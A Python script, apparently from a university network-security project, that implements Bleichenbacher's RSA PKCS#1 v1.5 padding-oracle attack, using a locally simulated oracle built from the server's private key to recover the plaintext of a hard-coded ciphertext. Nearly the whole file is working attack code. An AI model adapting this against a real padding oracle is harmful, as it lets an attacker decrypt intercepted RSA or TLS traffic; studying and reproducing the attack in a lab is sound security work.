import math
from binascii import *
from Crypto.PublicKey import RSA
import binascii


server_private_key_file = "/home/mohit/Dropbox/network_security_OSU/main_project/cse5473_security_project/Bleichenbacher/tlslite-ng-master/scripts/mj_keys/private.pem"
rsa_key = RSA.importKey(open(server_private_key_file, "rb").read())

PADDING_ORACLE_CALL_COUNT = 0
PADDING_ORACLE_FALSE_COUNT = 0
PADDING_ORACLE_TRUE_COUNT = 0

stat_file = open("stat_6.csv","w",encoding="utf8")

def padding_oracle(cipher):
    global PADDING_ORACLE_CALL_COUNT
    global PADDING_ORACLE_FALSE_COUNT
    global PADDING_ORACLE_TRUE_COUNT
    global stat_data

    # cipher_bytes = bytes.fromhex(cipher)
    decrypted = rsa_key.decrypt(cipher)

    # print( len(decrypted))
    # print(rsa_key.n)
    # print(decrypted)
    # print("\n")

    # print('{:0256x}'.format(int(binascii.hexlify(decrypted), 16)))
    
    msg_in_int = int(binascii.hexlify(decrypted), 16)
    msg_hex = '{:0256x}'.format(msg_in_int)
    PADDING_ORACLE_CALL_COUNT += 1

    if msg_hex[:4] == "0002":
        if '00' in msg_hex[4:]:
            # PADDING_ORACLE_TRUE_COUNT += 1
            stat_file.write(str(PADDING_ORACLE_CALL_COUNT) + ', '+'T, '+ str(msg_in_int)+'\n')
            # stat_data +=  str(PADDING_ORACLE_CALL_COUNT) + ', '+'T, '+  ', '+ str(msg_in_int)+'\n'    
            return True

    stat_file.write(str(PADDING_ORACLE_CALL_COUNT) + ', '+'F, '+ str(msg_in_int)+'\n')
    # stat_data +=  str(PADDING_ORACLE_CALL_COUNT) + ', '+'F, '+ ', '+ str(msg_in_int)+'\n'    
    # PADDING_ORACLE_FALSE_COUNT += 1
    return False


# Iterative Python3 program to compute faster modular power
 
# (x^y) % p in O(log y) time complexity
def fast_mod_exp(x, y, p) :
    res = 1     # Initialize result
 
    # Update x if it is more
    # than or equal to p
    x = x % p 
 
    while (y > 0) :
         
        # If y is odd, multiply
        # x with result
        if ((y & 1) == 1) :
            res = (res * x) % p
 
        # y must be even now
        y = y >> 1      # y = y/2
        x = (x * x) % p
         
    return res


def int_hex(n):
    string = '{:0256x}'.format(n)
    return ' '.join([string[i:i+2] for i in range(0, len(string), 2)])


# this was on message 
# def padding_oracle(number):
#     hex_number = '{:0256x}'.format(number)

#     if hex_number[:4] == "0002":
#         if '00' in hex_number[4:]:
#             return True
#     return False

def ceil(x, y):
    return x//y + (x%y !=0)

def floor(x,y):
    return x//y

def find_new_short_intervals(x, interval_set):
    """Find new intervals for given multiplier x
    
    [description]
    
    Arguments:
        x {int} -- the multiplier to the message
        interval_set {set} -- possible message value intervals for the multipler x
    
    Returns:
        [set] -- set of finally selected interval. 
    """
    B2 = padding_start
    B3 = padding_end + 1
    newM = set([])
    modulus_multiple_count = 0
    for (f,l) in interval_set: # for all intervals which will be shrinked
        for r in range(ceil((f*x - B3 + 1),n),
                       floor((l*x - B2),n) + 1):
            possible_shrink_left = ceil((B2 + r*n),x)
            possible_shrink_right = floor((B3 - 1 + r*n),x)
            new_interval_left = max(f,possible_shrink_left)
            new_interval_right = min(l,possible_shrink_right)

            if new_interval_left <= new_interval_right:
                newM |= set([ (new_interval_left, new_interval_right) ])
            # print("Value of r:   {}".format(r))
            # print(newa)
            # print(newb)
            modulus_multiple_count +=1
    print("Total intervals checked: "+ str(modulus_multiple_count))        
    print("Next Interval candidates ("+str(len(newM))+"): ", newM)
    return newM



def search_multiplier(cipher, n, x):
    print ("[-] Starting search for x (from value %i)" % x)
    num_of_interations = 1          # counter for iterations
    while True:
        next_landing_msg = ( fast_mod_exp(x, rsa_key.e, n)  * cipher ) % n

        if padding_oracle(next_landing_msg.to_bytes(256,byteorder='big')):   # call the (simulated) oracle
            break    # padding is correct, we have found x
        num_of_interations += 1
        x += 1      # try next value of x
    print ("Found next correct padding in %i iterations" % num_of_interations)
    print ("    x: %i" % x)
    return x



def search_multiplier_binary(cipher, n, x, f, l):
    """Search next multipler for given cipher
    in binary search fashion (applicable only when shrinkage
    transform to only one interval in orginal padding interval)
    
    [description]
    
    Arguments:
        cipher {int} -- cipher data
        n {int} -- modulus of public key
        x {int} -- previous padding matched multiplier
        f {int} -- first integer in padding interval
        l {int} -- last integer in padding interval
    
    Returns:
        int -- multiplier which matched next correct padding
    """
    B2 = padding_start
    B3 = padding_end + 1
    modulus_multiple = ceil((l*x - B2)*2,n) # starting value for modulus_multiple
    num_of_interations,modulus_multiple_count = 0,0    # for statistics
    found = False
    while not found:
        for x in range(ceil((B2 + modulus_multiple * n),l), floor((B3-1 + modulus_multiple * n),f)+1):
            mi = (fast_mod_exp(x, rsa_key.e, n) * cipher) % n
            num_of_interations += 1
            if padding_oracle(mi.to_bytes(256,byteorder='big')):
                found = True
                break # we found x
        if not found:
            modulus_multiple  += 1   # try next value for modulus_multiple
            modulus_multiple_count += 1
    print( "Found next correct padding in %i iterations" % (num_of_interations))
    print( "Number of modulus_multiple explored:  %i" % modulus_multiple_count)
    print( "%ith  multiplier: %i" % (num_of_interations, x))
    return x

# ------------------------


f = open("public.pem", "r")
key = RSA.importKey(f.read())


# cipher_hex = 'af:e2:ca:9f:5f:39:fa:a5:57:66:a0:9a:55:80:ff:57:11:03:61:6f:4e:67:10:02:af:60:35:9d:fa:2b:40:ee:5e:dd:33:de:0d:0c:b5:32:d2:8a:29:a3:2c:40:06:32:0b:1f:78:ee:c5:33:d8:3f:9f:63:99:f6:76:4d:4d:26:0d:f0:e3:22:48:d1:59:91:01:fe:07:09:5e:3f:56:bb:57:29:04:31:af:71:43:bb:c7:f8:3b:3d:75:e0:9e:cb:02:70:25:69:86:da:37:d7:b6:ad:24:d3:50:a4:b1:f9:9a:8a:9e:d3:9e:e1:c7:1d:7a:fb:d8:a7:fa:f3:7e:22'
# cipher_hex = '14:ce:de:ef:3c:6b:40:fe:73:29:45:46:f9:08:0b:a7:59:3b:c9:9b:82:d5:81:1f:47:e9:61:ab:07:f2:5f:83:7f:a5:2d:14:3f:0f:f2:b2:77:37:a9:8f:bb:f1:59:7b:ce:27:fe:a1:42:f3:47:7b:97:94:a0:d3:61:28:91:0d:d9:7b:2f:39:f3:2a:7f:7b:de:0c:f4:5e:3f:74:fa:26:74:3c:a3:60:19:c4:99:42:f5:37:78:7f:20:ce:1d:14:41:49:76:61:b3:b5:2a:49:bc:95:14:13:86:e7:a9:cd:45:70:0d:45:c4:aa:b2:ab:89:f3:9c:35:d5:5b:cb:99'
# cipher_hex = '11:01:8e:96:8f:91:f5:48:a2:f9:d4:a7:10:cf:6e:ee:75:aa:8c:f2:ff:22:a4:76:6d:a9:a9:77:26:b5:29:23:d0:6a:d7:ad:35:f2:fc:2d:e0:df:11:a0:42:40:7f:93:72:1b:c1:45:60:5d:65:5b:36:bd:61:5d:ec:2b:05:94:c2:b5:51:b9:4e:89:7b:8f:e1:db:47:43:59:6f:07:2f:73:e4:5f:7e:59:8d:b9:a1:f9:02:7d:ad:7f:30:e7:a9:d7:06:d3:e3:c9:77:86:cb:95:ae:d4:e1:9b:d9:94:cf:83:b0:ff:b5:23:13:12:0b:7f:1d:2d:d2:c2:02:f0:dd'

# cipher_hex = '2c:ed:c6:aa:02:63:1f:a4:38:e3:22:8b:f3:6f:a5:fd:c7:53:19:ae:a2:d6:94:bb:20:9b:46:05:74:91:58:0a:ac:c4:38:06:c8:bd:15:b6:23:0d:05:ff:ae:88:9d:80:4e:c1:10:60:f5:74:90:60:94:35:88:aa:a7:79:55:11:60:e8:99:e8:0c:05:27:05:02:a0:6a:64:3d:ba:55:a7:00:78:2b:74:c8:f8:26:1f:07:cc:db:c1:f4:0b:78:3f:45:4f:85:eb:3b:42:83:43:b0:99:8e:af:4d:ef:56:09:04:cb:92:54:4c:14:7b:b2:32:13:c4:aa:ec:b3:13:1d'

# cipher_hex = 'a8:0b:c0:ff:7d:3a:c2:27:51:db:31:2d:37:31:7d:e8:8a:e2:a9:4d:31:4b:d4:1e:68:a4:29:3a:87:0c:88:ec:85:e0:2f:03:39:18:ab:d3:1a:ad:da:37:25:05:3b:11:09:4c:45:8a:e2:b6:1a:c0:9a:be:21:aa:ed:79:a1:4f:f7:42:ee:80:87:e3:31:c1:19:a7:ca:7c:de:da:cd:f1:91:11:de:3a:23:3d:34:86:4c:dc:66:33:ed:52:6e:f7:9a:aa:48:b2:2d:25:8d:20:4c:6d:fc:69:62:67:6d:b6:5b:18:55:a3:ea:af:d5:43:98:19:5f:8e:04:dc:13:ac'
cipher_hex = '9c:f6:78:d1:31:64:1f:48:aa:02:e9:85:0f:c0:20:88:13:ed:d3:b8:50:9c:0a:dc:4c:95:b1:69:85:cc:9b:80:d1:a1:bb:0e:a2:81:bf:a8:1d:7e:e5:6d:be:6e:3f:d7:b3:9e:40:a2:71:45:e0:17:f4:1f:61:f6:b5:22:f5:a2:f3:c8:86:25:03:81:03:82:fa:54:71:b4:65:7f:50:0f:33:be:f8:88:be:58:99:f7:67:6d:f6:0f:c7:64:e3:00:94:74:9b:e0:e6:c9:98:53:a7:e9:35:7f:66:00:ae:b9:e3:f4:23:bb:c8:00:50:f1:67:b8:06:24:1a:06:3f:c8'

m = int(cipher_hex.replace(':',''),16)
n = key.n 
# n= 0X00e133440e6948ba3905e722442723bc5741fef35213731f3871de50c904676fefc836dc9253ead0a79dc89c42647d1614a3e167550e9890c379045e8822451fc83bf53ed66885654e9658bff02d5cdb13d5e28e9ac650c380552195ee5927eb51f9e6fbeef8fde1639f05b15e677958042d922e2f62c024071839e7602ddfed6f


# number of bytes in the modulus (n)
k= math.ceil(math.log(n, 256))
# print("number of bytes in n :", math.ceil(k))


# B = "00 02 00*126 times"  -- 1024 bit ==> 128 bytes,  00 02 occupies 2 bytes

B = int(math.pow(2,(k-2)*8))
# print("B in int :",B )
# print("B in hex :",'{:0256x}'.format(B))
# print("Length of B in hex :", len('{:02x}'.format(B)))

padding_start, padding_end = 2*B, 3*B-1

x = ceil(n,(padding_end+1)) # multiplier

interval_set = set([(padding_start, padding_end)])
do_binary_search = False

while len(interval_set) > 0:
    
    if not do_binary_search:
        x = search_multiplier(m, n, x)
    else:
        one_interval = next(iter(interval_set))
        x =  search_multiplier_binary(m, n, x, one_interval[0], one_interval[1])

    interval_set = find_new_short_intervals(x, interval_set)

    one_interval = next(iter(interval_set))

    print('---------------------------------------------------------------------------------------\n')
    if len(interval_set) == 1 and one_interval[0] != one_interval[1]:
        print("Binary Search Eligible")
        do_binary_search = True
    elif len(interval_set) == 1 and one_interval[0] == one_interval[1]:
        print("Search Over, Message Found :", one_interval[0])
        print("in Hex: ", int_hex(one_interval[0]))
        break
    else:
        do_binary_search = False 
        x= x+1
    


stat_file.close()

